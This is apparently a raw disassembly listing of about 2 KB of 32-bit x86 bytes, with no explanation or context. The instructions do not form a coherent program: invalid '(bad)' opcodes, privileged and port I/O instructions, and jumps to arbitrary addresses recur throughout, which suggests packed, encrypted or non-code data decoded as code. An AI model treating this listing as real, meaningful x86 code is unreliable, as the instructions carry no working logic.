  42f220:	fistp  DWORD PTR [ecx+0x31]
  42f223:	xor    eax,0xee0ae0f5
  42f228:	pop    eax
  42f229:	scas   eax,DWORD PTR es:[edi]
  42f22a:	pop    ebp
  42f22b:	ja     0x42f1b0
  42f22d:	push   0x34956d67
  42f232:	and    eax,0x12082ab5
  42f237:	xor    al,0xe7
  42f239:	adc    eax,0x9acfbbbf
  42f23e:	mov    ebx,0x2554067
  42f243:	mov    esp,0x8ff4c24c
  42f248:	push   ebx
  42f249:	into   
  42f24a:	(bad)  
  42f24b:	cmp    BYTE PTR es:[edi-0x41],dh
  42f24f:	mov    BYTE PTR [edx],ch
  42f251:	pushf  
  42f252:	or     ebx,DWORD PTR [ebp+0x67]
  42f255:	push   ebp
  42f256:	cs mov dh,0xdc
  42f259:	popf   
  42f25a:	stc    
  42f25b:	jbe    0x42f1eb
  42f25d:	push   0x8a5db637
  42f262:	pop    edi
  42f263:	xor    esi,edi
  42f265:	jns    0x42f2cc
  42f267:	jnp    0x42f2b9
  42f269:	or     DWORD PTR ds:0xd0d79c9d,esp
  42f26f:	(bad)  
  42f270:	pop    ss
  42f271:	dec    ecx
  42f272:	in     al,0x46
  42f274:	mov    ds:0x7d242a01,al
  42f279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f27a:	retf   
  42f27b:	mov    al,0xda
  42f27d:	out    dx,al
  42f27e:	jno    0x42f252
  42f280:	(bad)  
  42f281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f282:	and    eax,0x923924eb
  42f287:	int3   
  42f288:	jae    0x42f2bd
  42f28a:	pop    ds
  42f28b:	das    
  42f28c:	xchg   DWORD PTR [esi-0x54bfb475],ebx
  42f292:	pop    edi
  42f293:	jmp    0xd762:0x7200aa18
  42f29a:	mov    edi,0x22836034
  42f29f:	lods   eax,DWORD PTR ds:[esi]
  42f2a0:	jbe    0x42f2bf
  42f2a2:	pop    ds
  42f2a3:	push   ss
  42f2a4:	and    ah,BYTE PTR [edx]
  42f2a6:	pop    ecx
  42f2a7:	call   0xcdfbf91a
  42f2ac:	mov    ah,BYTE PTR [ecx-0x31]
  42f2af:	aam    0x11
  42f2b1:	xor    esi,ecx
  42f2b3:	(bad)  
  42f2b4:	iret   
  42f2b5:	popf   
  42f2b6:	sti    
  42f2b7:	add    DWORD PTR [ecx],esi
  42f2b9:	sbb    esp,0xffffffa8
  42f2bc:	mov    es,WORD PTR [esi-0x60]
  42f2bf:	adc    eax,0xe4b08ed9
  42f2c4:	jb     0x42f24c
  42f2c6:	in     eax,0x4b
  42f2c8:	lds    ebp,FWORD PTR ds:0x8504ea06
  42f2ce:	stos   DWORD PTR es:[edi],eax
  42f2cf:	mov    DWORD PTR [edi],0xbcfd7aea
  42f2d5:	jle    0x42f267
  42f2d7:	jmp    0x42f2a8
  42f2d9:	or     BYTE PTR [eax-0xf],al
  42f2dc:	pop    esi
  42f2dd:	mov    ds:0x84ac24eb,al
  42f2e2:	ds in  al,0x75
  42f2e5:	imul   ecx,DWORD PTR [edx-0xb],0x98747e36
  42f2ec:	push   eax
  42f2ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f2ee:	leave  
  42f2ef:	cwde   
  42f2f0:	jge    0x42f2b5
  42f2f2:	(bad)  [edi+0x75]
  42f2f5:	mov    gs,WORD PTR [esi]
  42f2f7:	out    dx,eax
  42f2f8:	repz imul esp,DWORD PTR [esi+0x2c691ae6],0x74
  42f300:	cmp    eax,0x97957243
  42f305:	cwde   
  42f306:	cmp    al,0x30
  42f308:	bnd lock jp 0x42f353
  42f30c:	push   ebp
  42f30d:	cmp    DWORD PTR [ecx+0x18991c10],edi
  42f313:	into   
  42f314:	outs   dx,DWORD PTR ds:[esi]
  42f315:	xor    ebx,eax
  42f317:	int3   
  42f318:	int3   
  42f319:	mov    al,ds:0x272a873b
  42f31e:	dec    eax
  42f31f:	leave  
  42f320:	dec    ecx
  42f321:	test   al,0x16
  42f323:	ret    
  42f324:	sahf   
  42f325:	call   0xb960d859
  42f32a:	cmp    bl,dh
  42f32c:	mov    eax,0xb94e6c0e
  42f331:	cdq    
  42f332:	aad    0x5
  42f334:	inc    ebp
  42f335:	fstp   QWORD PTR [edx+esi*8]
  42f338:	xor    BYTE PTR [ecx-0x21],ch
  42f33b:	sbb    eax,0x9473a4e1
  42f340:	fwait
  42f341:	xchg   edi,esi
  42f343:	mov    WORD PTR ds:0x4ae75a4f,ss
  42f349:	xor    eax,0xe91cbbfe
  42f34e:	xchg   esp,eax
  42f34f:	ja     0x42f365
  42f351:	jae    0x42f2de
  42f353:	lods   eax,DWORD PTR ds:[esi]
  42f354:	into   
  42f355:	or     DWORD PTR [ebx],0x607e45f7
  42f35b:	in     al,dx
  42f35c:	and    BYTE PTR [ebx],cl
  42f35e:	nop
  42f35f:	idiv   BYTE PTR [eax+0x59634929]
  42f365:	jmp    0x42f2ea
  42f367:	jge    0x42f2f2
  42f369:	sbb    DWORD PTR [ebp+0x6ba2a914],esi
  42f36f:	retf   0xaa13
  42f372:	xchg   esp,eax
  42f373:	scas   eax,DWORD PTR es:[edi]
  42f374:	sub    esi,DWORD PTR [ecx+ebx*4-0x40b8b17b]
  42f37b:	les    ebp,FWORD PTR [ecx+0x0]
  42f37e:	xchg   esi,eax
  42f37f:	sub    dl,BYTE PTR [ebp+0x69e8e42e]
  42f385:	push   esp
  42f386:	jbe    0x42f325
  42f388:	and    bh,cl
  42f38a:	mov    dl,0x88
  42f38c:	mul    DWORD PTR [edx-0x27247423]
  42f392:	sub    esi,DWORD PTR [eax]
  42f394:	adc    al,0x3e
  42f396:	xchg   esi,eax
  42f397:	lds    esp,FWORD PTR [eax]
  42f399:	xchg   ebx,eax
  42f39a:	std    
  42f39b:	mov    edi,0x30f7291c
  42f3a0:	(bad)
  42f3a3:	sbb    bl,BYTE PTR [ecx-0x4806f45a]
  42f3a9:	cmpxchg DWORD PTR [ebp-0x1e719d42],eax
  42f3b0:	mov    dh,0x95
  42f3b2:	mov    esp,0xdc813384
  42f3b7:	lock test DWORD PTR [edx-0x68771651],ecx
  42f3be:	dec    ebp
  42f3bf:	xchg   edx,eax
  42f3c0:	sbb    ch,BYTE PTR [ecx]
  42f3c2:	jl     0x42f429
  42f3c4:	iret   
  42f3c5:	push   edx
  42f3c6:	scas   al,BYTE PTR es:[edi]
  42f3c7:	outs   dx,DWORD PTR ds:[esi]
  42f3c8:	int3   
  42f3c9:	jae    0x42f438
  42f3cb:	in     al,dx
  42f3cc:	jle    0x42f371
  42f3ce:	xchg   DWORD PTR [edi+0xe08aacf],edx
  42f3d4:	pop    ss
  42f3d5:	mov    ecx,0xb873a8f8
  42f3da:	jbe    0x42f39e
  42f3dc:	in     al,0x9f
  42f3de:	imul   esp,DWORD PTR [edx-0x1f3e435c],0xfffffff2
  42f3e5:	in     eax,dx
  42f3e6:	mov    dh,0x79
  42f3e8:	lods   al,BYTE PTR ds:[esi]
  42f3e9:	pushf  
  42f3ea:	stos   DWORD PTR es:[edi],eax
  42f3eb:	cwde   
  42f3ec:	repnz popa 
  42f3ee:	sub    eax,0x3bb5253c
  42f3f3:	push   es
  42f3f4:	cmc    
  42f3f5:	xchg   edi,eax
  42f3f6:	jns    0x42f455
  42f3f8:	leave  
  42f3f9:	lahf   
  42f3fa:	mov    esi,0x85b04ff
  42f3ff:	jns    0x42f421
  42f401:	lds    ecx,FWORD PTR [ebx-0x7]
  42f404:	out    dx,al
  42f405:	sub    BYTE PTR [ebx-0x66],0x35
  42f409:	jb     0x42f3fe
  42f40b:	out    dx,al
  42f40c:	int    0x96
  42f40e:	retf   0x1979
  42f411:	jmp    0x3d3917a8
  42f416:	push   ecx
  42f417:	pop    ebp
  42f418:	lods   al,BYTE PTR ds:[esi]
  42f419:	add    edi,edx
  42f41b:	imul   eax,DWORD PTR [ebp-0x36],0x348f016
  42f422:	scas   eax,DWORD PTR es:[edi]
  42f423:	in     al,0x1d
  42f425:	sbb    esp,eax
  42f427:	das    
  42f428:	pop    ss
  42f429:	jl     0x42f3c0
  42f42b:	mov    WORD PTR fs:[ebx+0x16ac2deb],fs
  42f432:	bound  edx,QWORD PTR [ebx-0x4e51f70e]
  42f438:	cli    
  42f439:	aad    0xb1
  42f43b:	inc    esp
  42f43c:	retf   0x7d1a
  42f43f:	push   0xffffffd6
  42f441:	jmp    0x42f474
  42f443:	enter  0x43a7,0x74
  42f447:	pop    esp
  42f448:	and    eax,0x6a9da9db
  42f44d:	retf   
  42f44e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f44f:	xchg   ecx,eax
  42f450:	lods   al,BYTE PTR ds:[esi]
  42f451:	push   es
  42f452:	mov    edi,0x3bf4eee4
  42f457:	(bad)  
  42f458:	jns    0x42f4aa
  42f45a:	fwait
  42f45b:	mov    ecx,0xa4b15915
  42f460:	jb     0x42f3ff
  42f462:	outs   dx,DWORD PTR ds:[esi]
  42f463:	ror    DWORD PTR [edx],cl
  42f465:	jmp    0x42f430
  42f467:	xchg   esp,eax
  42f468:	pusha  
  42f469:	mov    bh,0x79
  42f46b:	test   eax,0x32b1af03
  42f470:	repnz pop ecx
  42f472:	stc    
  42f473:	jmp    0x61e4:0xb1b68904
  42f47a:	mov    bh,0x34
  42f47c:	cmp    BYTE PTR [eax+0x15f745fd],ch
  42f482:	jmp    0xddf20243
  42f487:	call   0x300e8c2c
  42f48c:	push   cs
  42f48d:	xchg   BYTE PTR [eax+ecx*2+0x1],dl
  42f491:	fst    st(4)
  42f494:	and    ch,BYTE PTR ds:0xecd62614
  42f49a:	rcr    BYTE PTR [esi],cl
  42f49c:	dec    esp
  42f49d:	(bad)  
  42f49f:	rol    BYTE PTR [esi],cl
  42f4a1:	jnp    0x42f4d9
  42f4a3:	mov    edi,0x84ba5cb5
  42f4a8:	sar    BYTE PTR [edx],cl
  42f4aa:	lods   al,BYTE PTR ds:[esi]
  42f4ab:	sub    al,0xd5
  42f4ad:	mov    ebp,0x6425e893
  42f4b2:	loope  0x42f50b
  42f4b4:	and    ebp,ecx
  42f4b6:	outs   dx,BYTE PTR ds:[esi]
  42f4b7:	dec    esp
  42f4b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f4b9:	cmp    BYTE PTR [edx-0x7e],ch
  42f4bc:	cmp    ah,BYTE PTR [ebx+0x53b1663b]
  42f4c2:	out    dx,eax
  42f4c3:	push   0xef3b1947
  42f4c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f4c9:	ins    BYTE PTR es:[edi],dx
  42f4ca:	mov    edi,0x88bc6214
  42f4cf:	arpl   WORD PTR [ebp-0x2a],dx
  42f4d2:	cdq    
  42f4d3:	hlt    
  42f4d4:	fcomp  DWORD PTR [edi]
  42f4d6:	xlat   BYTE PTR ds:[ebx]
  42f4d7:	push   ss
  42f4d8:	inc    edi
  42f4d9:	or     DWORD PTR [ebp-0x75],edx
  42f4dc:	bound  eax,QWORD PTR ds:0x7ef06d6b
  42f4e2:	xor    bl,0xd6
  42f4e5:	sar    BYTE PTR [eax+0x39e0060],0xb5
  42f4ec:	and    al,0xd6
  42f4ee:	inc    edx
  42f4ef:	inc    ecx
  42f4f0:	mov    ds:0xc4088c12,al
  42f4f5:	gs push ebp
  42f4f7:	cld    
  42f4f8:	mov    bl,BYTE PTR [edx]
  42f4fa:	mov    bh,0xc
  42f4fc:	mov    bh,0x2d
  42f4fe:	cli    
  42f4ff:	xlat   BYTE PTR ds:[ebx]
  42f500:	jne    0x42f48d
  42f502:	xor    al,0xeb
  42f504:	mov    cl,0x50
  42f506:	add    eax,0xbc3b2d07
  42f50b:	xchg   esp,eax
  42f50c:	dec    edi
  42f50d:	in     al,0xcb
  42f50f:	rcl    DWORD PTR [ebp+0x5e7f0d2],cl
  42f515:	jnp    0x42f51d
  42f517:	sbb    esp,eax
  42f519:	sub    al,0xdd
  42f51b:	dec    ecx
  42f51c:	sub    DWORD PTR [ecx-0x427d671d],esp
  42f522:	jno    0x42f587
  42f524:	jl     0x42f4c7
  42f526:	mov    ebp,DWORD PTR [ebp-0x2d]
  42f529:	loope  0x42f55e
  42f52b:	jne    0x42f567
  42f52d:	xor    al,BYTE PTR [ecx+edx*1-0x71]
  42f531:	sahf   
  42f532:	mov    ah,0xd4
  42f534:	cmp    eax,0xecafc1d7
  42f539:	xchg   DWORD PTR [ebp-0x70610508],ebx
  42f53f:	sub    DWORD PTR [esi-0x7e],edx
  42f542:	cmp    BYTE PTR [edx+0x329f091b],bl
  42f548:	daa    
  42f549:	(bad)
  42f54c:	and    BYTE PTR [edx+0x3f85def9],bh
  42f552:	or     ch,cl
  42f554:	mul    edx
  42f556:	js     0x42f551
  42f558:	lea    esp,[edx+0x67f060b3]
  42f55e:	int    0xa7
  42f560:	imul   BYTE PTR [eax+ecx*8]
  42f563:	fistp  DWORD PTR [eax]
  42f565:	aad    0xa2
  42f567:	and    eax,DWORD PTR [ebp+0x76]
  42f56a:	(bad)  
  42f56b:	test   eax,0x6527439b
  42f570:	pop    ds
  42f571:	daa    
  42f572:	push   ebx
  42f573:	dec    edx
  42f574:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f576:	sub    esp,DWORD PTR [eax-0x6adc05c8]
  42f57c:	mov    esi,0x4d7bca3
  42f581:	mov    edi,0x9255f543
  42f586:	xchg   ebp,eax
  42f587:	cld    
  42f588:	xor    DWORD PTR [edi-0x6a],ecx
  42f58b:	jbe    0x42f52f
  42f58d:	mov    DWORD PTR [edx+eiz*1-0x255c6c96],edi
  42f594:	jbe    0x42f5f8
  42f596:	mov    bl,0xbc
  42f598:	sbb    eax,0x4ac080f9
  42f59d:	push   edx
  42f59e:	jnp    0x42f5fb
  42f5a0:	retf   0xad5d
  42f5a3:	add    esi,DWORD PTR [edi-0x5a]
  42f5a6:	fild   WORD PTR [eax]
  42f5a8:	jmp    0x8409:0x1880c463
  42f5af:	cwde   
  42f5b0:	imul   ebp,eax,0x9cbb3d64
  42f5b6:	or     ebp,DWORD PTR [edx-0x16]
  42f5b9:	xchg   BYTE PTR [eax-0x74],bh
  42f5bc:	and    eax,0x484890ac
  42f5c1:	inc    ebp
  42f5c2:	mov    ah,0xd4
  42f5c4:	mov    ah,0x92
  42f5c6:	std    
  42f5c7:	pop    ss
  42f5c8:	jne    0x42f558
  42f5ca:	pop    esp
  42f5cb:	jmp    0x42f5a0
  42f5cd:	or     DWORD PTR [ebp-0x14f6e307],esi
  42f5d3:	hlt    
  42f5d4:	mov    bh,0x22
  42f5d6:	fimul  WORD PTR [eax]
  42f5d8:	(bad)  
  42f5d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5da:	mov    ebx,0x7f5bb3ee
  42f5df:	mov    WORD PTR [ecx+0x7d],cs
  42f5e2:	cmp    ch,BYTE PTR [esi+0x18]
  42f5e5:	jmp    0x5824ca1e
  42f5ea:	aaa    
  42f5eb:	rol    edi,cl
  42f5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5ee:	retf   
  42f5ef:	rcl    ch,1
  42f5f1:	mov    DWORD PTR [esi-0x63a65a6d],ebp
  42f5f7:	fisubr DWORD PTR [edi]
  42f5f9:	inc    eax
  42f5fa:	inc    DWORD PTR [esi-0x596772e8]
  42f600:	mov    ds:0x25d1fe9b,eax
  42f605:	xor    eax,0xf981f665
  42f60a:	mov    al,ds:0x9e4072f
  42f60f:	inc    BYTE PTR [ebp-0x70]
  42f612:	adc    al,0x19
  42f614:	fxtract 
  42f616:	mov    dl,0xf4
  42f618:	retf   
  42f619:	or     edx,DWORD PTR [ecx]
  42f61b:	nop
  42f61c:	or     ebx,DWORD PTR [ebp+esi*4+0x5a39b7d8]
  42f623:	dec    esi
  42f624:	or     BYTE PTR [ebx],bh
  42f626:	cmp    ecx,DWORD PTR [ecx+eax*1+0x68]
  42f62a:	mov    dl,0x44
  42f62c:	stos   BYTE PTR es:[edi],al
  42f62d:	jns    0x42f5fb
  42f62f:	adc    eax,0xd52834b4
  42f634:	sub    DWORD PTR [ebx],ecx
  42f636:	mov    ebx,0x885924a6
  42f63b:	out    0xec,al
  42f63d:	mov    esp,0xa7de7f39
  42f642:	stos   DWORD PTR es:[edi],eax
  42f643:	and    DWORD PTR [ebx-0x21],edx
  42f646:	mov    ecx,0x242dfd2b
  42f64b:	ss icebp 
  42f64d:	loopne 0x42f606
  42f64f:	hlt    
  42f650:	stos   DWORD PTR es:[edi],eax
  42f651:	mov    bh,0x2d
  42f653:	retf   
  42f654:	in     al,0xc8
  42f656:	fwait
  42f657:	(bad)  
  42f658:	xchg   ebp,eax
  42f659:	add    DWORD PTR [ecx-0x10],ebp
  42f65c:	fcmovne st,st(1)
  42f65e:	fsubr  DWORD PTR [ebx]
  42f660:	sbb    ecx,ebx
  42f662:	sbb    BYTE PTR [ebx-0x70],al
  42f665:	iret   
  42f666:	mov    esi,esp
  42f668:	(bad)  
  42f669:	mov    dh,0x7b
  42f66b:	es aad 0x4b
  42f66e:	test   BYTE PTR [ebx+0x45],0x22
  42f672:	sti    
  42f673:	mov    ds:0x351baaf7,eax
  42f678:	add    BYTE PTR [ecx-0x30cebbf5],ah
  42f67e:	cld    
  42f67f:	sahf   
  42f680:	aam    0x9d
  42f682:	fwait
  42f683:	ss repz push eax
  42f686:	adc    eax,0x5c7b919b
  42f68b:	mov    ebp,0x6c9c5922
  42f690:	or     al,0x1a
  42f692:	adc    ah,BYTE PTR [ecx-0x35]
  42f695:	or     ebx,DWORD PTR ds:0x6ba46067
  42f69b:	sub    BYTE PTR [edx],dl
  42f69d:	push   cs
  42f69e:	iret   
  42f69f:	jg     0x42f6cc
  42f6a1:	imul   eax,DWORD PTR [ebx+edx*1],0x61385106
  42f6a8:	sbb    DWORD PTR [eax],esp
  42f6aa:	or     eax,eax
  42f6ac:	push   ebp
  42f6ad:	mov    ch,0xc5
  42f6af:	repnz iret 
  42f6b1:	test   eax,0x391830af
  42f6b6:	out    dx,al
  42f6b7:	push   cs
  42f6b8:	outs   dx,BYTE PTR ds:[esi]
  42f6b9:	repnz nop
  42f6bb:	das    
  42f6bc:	imul   esp,DWORD PTR [edi-0x73],0xffffffc7
  42f6c0:	xlat   BYTE PTR ds:[ebx]
  42f6c1:	sahf   
  42f6c2:	sti    
  42f6c3:	push   eax
  42f6c4:	mov    dl,0xef
  42f6c6:	ret    
  42f6c7:	mov    ecx,0xb52a291f
  42f6cc:	pop    edx
  42f6cd:	xchg   esi,eax
  42f6ce:	xor    cl,BYTE PTR [edx]
  42f6d0:	imul   esp,DWORD PTR [edi+0x66f137eb],0x2d61fa7
  42f6da:	ret    
  42f6db:	in     al,dx
  42f6dc:	js     0x42f665
  42f6de:	push   DWORD PTR [esi]
  42f6e0:	iret   
  42f6e1:	push   esp
  42f6e2:	mov    eax,0x7f47d3d4
  42f6e7:	scas   eax,DWORD PTR es:[edi]
  42f6e8:	xchg   edx,eax
  42f6e9:	loop   0x42f708
  42f6eb:	sub    eax,0xd1349696
  42f6f0:	jae    0x42f6b4
  42f6f2:	mov    dl,0x8
  42f6f4:	and    BYTE PTR [ecx-0x3b],ch
  42f6f7:	dec    BYTE PTR [edi+edx*1]
  42f6fa:	push   0x6e
  42f6fc:	(bad)  
  42f6fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6fe:	jmp    0x42f6ad
  42f700:	std    
  42f701:	lds    eax,FWORD PTR [esi-0x7b6bb461]
  42f707:	add    eax,edx
  42f709:	pop    ecx
  42f70a:	mov    ecx,0x6d1f0e54
  42f70f:	push   es
  42f710:	jne    0x42f6ac
  42f712:	mov    ebx,0xacfa1385
  42f717:	sub    esi,ebp
  42f719:	sbb    esi,DWORD PTR [eax-0x4a5370b8]
  42f71f:	in     al,0x9f
  42f721:	inc    edx
  42f722:	sbb    eax,0xc350354a
  42f727:	lock es clc 
  42f72a:	call   0x109c1c75
  42f72f:	inc    esi
  42f730:	xor    eax,0xaddd4ec
  42f735:	mov    ds:0x1405d7bb,al
  42f73a:	jge    0x42f778
  42f73c:	jne    0x42f6be
  42f73e:	pcmpeqw mm0,mm0
  42f741:	pop    ecx
  42f742:	mov    dh,0x94
  42f744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f745:	jno    0x42f7b7
  42f747:	push   cs
  42f748:	add    eax,0x78eaebd7
  42f74d:	repnz in eax,dx
  42f74f:	mov    al,ds:0x965249ae
  42f754:	mov    bh,0x9d
  42f756:	jnp    0x42f78b
  42f758:	fnstsw WORD PTR [ebp-0x590a4460]
  42f75e:	mov    ds:0xe363f4ed,al
  42f763:	ins    DWORD PTR es:[edi],dx
  42f764:	mov    DWORD PTR [ecx+0x47],ebx
  42f767:	jno    0x42f772
  42f769:	sub    al,0xb1
  42f76b:	push   es
  42f76c:	and    dh,BYTE PTR [ecx-0x8]
  42f76f:	mov    bl,0xf0
  42f771:	mov    eax,ds:0x43ecf6db
  42f776:	xlat   BYTE PTR ds:[ebx]
  42f777:	sub    dl,ch
  42f779:	jnp    0x42f70b
  42f77b:	mov    ebx,0xd4b2117d
  42f780:	les    edi,FWORD PTR [ebx+0x24ed9273]
  42f786:	bndldx bnd3,[eax]
  42f789:	xchg   ecx,eax
  42f78a:	sub    esi,esp
  42f78c:	pop    edx
  42f78d:	fcmovne st,st(7)
  42f78f:	pushf  
  42f790:	and    DWORD PTR [ecx-0x435a24b],ecx
  42f796:	ins    DWORD PTR es:[edi],dx
  42f797:	push   ds
  42f798:	sbb    eax,0x3c4fdbcb
  42f79d:	retf   0x92d0
  42f7a0:	leave  
  42f7a1:	add    ebp,DWORD PTR [ebx+0x15]
  42f7a4:	and    DWORD PTR [ebp-0x20],edx
  42f7a7:	into   
  42f7a8:	retf   0xe720
  42f7ab:	lods   al,BYTE PTR ds:[esi]
  42f7ac:	adc    esp,DWORD PTR [esp+edi*4]
  42f7af:	xchg   esp,eax
  42f7b0:	sub    eax,DWORD PTR [ecx+eax*2]
  42f7b3:	jmp    0x42f74a
  42f7b5:	int3   
  42f7b6:	sub    bl,bh
  42f7b8:	jle    0x42f78f
  42f7ba:	call   0xc5f2:0x2799d3ae
  42f7c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f7c2:	cmp    edi,edx
  42f7c4:	dec    ebp
  42f7c5:	add    DWORD PTR [ebp+0x67],ecx
  42f7c8:	sbb    al,0x92
  42f7ca:	lea    ecx,ds:0x2bd0baa3
  42f7d0:	ss cli 
  42f7d2:	mov    ah,0x52
  42f7d4:	and    ecx,ecx
  42f7d6:	call   0xac951de6
  42f7db:	and    ebx,0xb7062b9a
  42f7e1:	adc    BYTE PTR [ebx+0x5e8b01a0],cl
  42f7e7:	aas    
  42f7e8:	mov    bh,0xfd
  42f7ea:	inc    edx
  42f7eb:	call   0x24f8c2a7
  42f7f0:	push   esi
  42f7f1:	das    
  42f7f2:	mov    fs,WORD PTR [ebp+edx*2+0x66e66bc0]
  42f7f9:	jb     0x42f7fb
  42f7fb:	fcomp  DWORD PTR [edx]
  42f7fd:	cmp    DWORD PTR [edx-0x29e9c9cf],esp
  42f803:	cld    
  42f804:	xor    eax,0xdffcbf4f
  42f809:	pop    ebp
  42f80a:	cmp    esp,DWORD PTR [ecx]
  42f80c:	stc    
  42f80d:	adc    cl,bl
  42f80f:	mov    ah,0x74
  42f811:	mov    ds:0x66d85063,eax
  42f816:	pop    edi
  42f817:	(bad)  
  42f81a:	in     al,dx
  42f81b:	mov    al,0x36
  42f81d:	sahf   
  42f81e:	retf   
  42f81f:	je     0x42f818
  42f821:	lds    eax,FWORD PTR [ebx]
  42f823:	call   0x48877f3e
  42f828:	fidiv  WORD PTR [eax+eiz*1+0x55]
  42f82c:	jo     0x42f823
  42f82e:	into   
  42f82f:	pop    ebp
  42f830:	push   edi
  42f831:	cmp    DWORD PTR [esi-0x5af966f4],edi
  42f837:	daa    
  42f838:	jne    0x42f882
  42f83a:	push   ecx
  42f83b:	call   0xdde7f19
  42f840:	push   cs
  42f841:	dec    ecx
  42f842:	mov    ecx,0x62f18f4
  42f847:	fbld   TBYTE PTR ds:0x5be4feb6
  42f84d:	pop    ds
  42f84e:	ror    BYTE PTR [edx+0x25],1
  42f851:	fstp   DWORD PTR [ebx+ecx*2]
  42f854:	adc    eax,0xc57064ab
  42f859:	scas   al,BYTE PTR es:[edi]
  42f85a:	mov    ebx,0xe346c8cb
  42f85f:	inc    eax
  42f860:	cmp    DWORD PTR [ecx-0x46e0f8b9],esp
  42f866:	mov    dx,0xdc94
  42f86a:	(bad)
  42f86d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f86e:	or     ecx,ecx
  42f870:	xor    ebp,esp
  42f872:	nop
  42f873:	jae    0x42f855
  42f875:	sub    bl,BYTE PTR [ebx]
  42f877:	dec    DWORD PTR [ebp+0x71f4b686]
  42f87d:	mov    bh,0x9b
  42f87f:	fdivr  DWORD PTR [ecx+0x3a]
  42f882:	xchg   esi,eax
  42f883:	fisubr WORD PTR [ebp-0x6e]
  42f886:	mov    cl,0xa4
  42f888:	rol    BYTE PTR [ecx+eiz*1],cl
  42f88b:	pushf  
  42f88c:	xchg   ebp,eax
  42f88d:	out    0x2c,al
  42f88f:	add    eax,0xe8657e1a
  42f894:	hlt    
  42f895:	test   eax,0xf448d7eb
  42f89a:	add    ebx,DWORD PTR [esp+ecx*1]
  42f89d:	bound  ebx,QWORD PTR [eax+0x6c]
  42f8a0:	push   ss
  42f8a1:	sbb    esi,eax
  42f8a3:	leave  
  42f8a4:	xchg   edi,eax
  42f8a5:	sub    bh,dl
  42f8a7:	shl    BYTE PTR [ebp-0x42],cl
  42f8aa:	sbb    DWORD PTR [ebp-0x384c86a9],ebx
  42f8b0:	or     cl,BYTE PTR [ebx+0xa]
  42f8b3:	xlat   BYTE PTR ds:[ebx]
  42f8b4:	xor    edi,DWORD PTR ss:[esi-0x3326e798]
  42f8bb:	addr16 cmp ebp,0xa74fc786
  42f8c2:	cmp    edi,DWORD PTR [ebp+0x6379de8f]
  42f8c8:	xchg   ebx,eax
  42f8c9:	lea    ebp,[esi+0x14]
  42f8cc:	lods   eax,DWORD PTR ds:[esi]
  42f8cd:	repz mov ebx,0xfc8f4ed4
  42f8d3:	dec    edx
  42f8d4:	inc    eax
  42f8d5:	jl     0x42f8d2
  42f8d7:	call   0xe5ad93e1
  42f8dc:	add    al,0x9d
  42f8de:	or     BYTE PTR [eax+0x23],0x49
  42f8e2:	fst    DWORD PTR [ecx-0x34]
  42f8e5:	jae    0x42f8bc
  42f8e7:	into   
  42f8e8:	cdq    
  42f8e9:	jbe    0x42f8c8
  42f8eb:	jb     0x42f92a
  42f8ed:	popf   
  42f8ee:	ja     0x42f925
  42f8f0:	dec    esi
  42f8f1:	sub    al,0xa4
  42f8f3:	popa   
  42f8f4:	and    ch,BYTE PTR [ecx]
  42f8f6:	adc    BYTE PTR [ecx-0x74],0xd6
  42f8fa:	pop    ecx
  42f8fb:	sub    ecx,DWORD PTR [ebx]
  42f8fd:	ins    DWORD PTR es:[edi],dx
  42f8fe:	jg     0x42f902
  42f900:	test   al,0xb1
  42f902:	jno    0x42f893
  42f904:	sbb    al,0x1
  42f906:	pop    eax
  42f907:	inc    ebx
  42f908:	int    0xcc
  42f90a:	ret    
  42f90b:	hlt    
  42f90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f90d:	imul   ecx,edx,0xfffffff4
  42f910:	jbe    0x42f96e
  42f912:	mov    DWORD PTR [eax+0x50bb9b01],eax
  42f918:	dec    eax
  42f919:	cmp    edi,edx
  42f91b:	not    WORD PTR [ebx-0x1109a437]
  42f922:	(bad)  
  42f923:	and    al,0xb1
  42f925:	scas   eax,DWORD PTR es:[edi]
  42f926:	aad    0xca
  42f928:	call   0x3775368e
  42f92d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f92e:	addr16 jmp 0x42f8f5
  42f931:	test   DWORD PTR [eax+0x2689214f],0x82c2f682
  42f93b:	adc    ah,BYTE PTR [edx]
  42f93d:	popf   
  42f93e:	stos   DWORD PTR es:[edi],eax
  42f93f:	mul    DWORD PTR [edx+0x35]
  42f942:	jl     0x42f8e8
  42f944:	fs enter 0x2ec3,0x1a
  42f949:	mov    edx,0x530d4fa
  42f94e:	pop    ds
  42f94f:	bound  edx,QWORD PTR [edi]
  42f951:	aas    
  42f952:	idiv   DWORD PTR [eax-0x1b]
  42f955:	xchg   esi,eax
  42f956:	sahf   
  42f957:	icebp  
  42f958:	enter  0x283d,0x4e
  42f95c:	nop
  42f95d:	sub    DWORD PTR [edi],ebp
  42f95f:	stc    
  42f960:	sub    DWORD PTR [eax+0x134f7cb6],0x47a540be
  42f96a:	retf   0x4ee4
  42f96d:	clc    
  42f96e:	mov    esp,0x8d191f9b
  42f973:	jnp    0x42f9de
  42f975:	fnstcw WORD PTR ds:0x19a7287a
  42f97b:	jle    0x42f912
  42f97d:	aad    0x61
  42f97f:	clc    
  42f980:	fld    QWORD PTR [edx]
  42f982:	stos   BYTE PTR es:[edi],al
  42f983:	cmp    DWORD PTR [ebx],esp
  42f985:	dec    ebp
  42f986:	adc    DWORD PTR [ebp-0xa500cb2],esp
  42f98c:	adc    eax,0xa4ef6225
  42f991:	call   0x3c67:0xb4e7bebb
  42f998:	jecxz  0x42f9d6
  42f99a:	daa    
  42f99b:	fdiv   DWORD PTR [ebp-0x6bb45ab]
  42f9a1:	mov    al,0x71
  42f9a3:	push   ebx
  42f9a4:	pop    esi
  42f9a5:	mov    al,ds:0x1a45eafb
  42f9aa:	bound  ebp,QWORD PTR [eax-0x80]
  42f9ad:	icebp  
